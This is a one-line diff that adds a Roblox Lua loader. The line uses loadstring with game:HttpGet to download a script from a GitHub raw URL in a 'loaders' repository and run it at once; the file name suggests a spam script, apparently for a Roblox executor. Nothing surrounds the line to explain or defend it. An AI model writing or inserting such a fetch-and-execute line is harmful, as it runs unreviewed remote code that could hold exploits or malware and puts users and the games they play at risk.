@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/sarab-spam3-ygx4pvzzgg5rnl.lua"))()
